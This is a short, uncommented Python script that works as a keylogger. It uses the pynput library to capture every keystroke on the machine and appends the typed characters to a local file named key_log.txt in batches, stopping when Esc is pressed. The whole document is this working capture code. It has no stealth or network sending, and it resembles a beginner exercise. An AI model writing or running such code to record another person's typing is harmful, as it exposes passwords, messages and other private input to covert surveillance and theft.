
count = 0
keys = []

from pynput.keyboard import Key, Listener

def on_press(key):
    global keys, count

    keys.append(key)
    count += 1
    print("{0} pressed".format(key))

    if count >= 10:
        count = 0
        write_file(keys)
        keys = []

   

def write_file(keys):
    with open("key_log.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'"," ")
            if k.find("space") > 0:
                f.write(str('\n'))
            elif k.find("key") == -1:
                f.write(k)


def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
    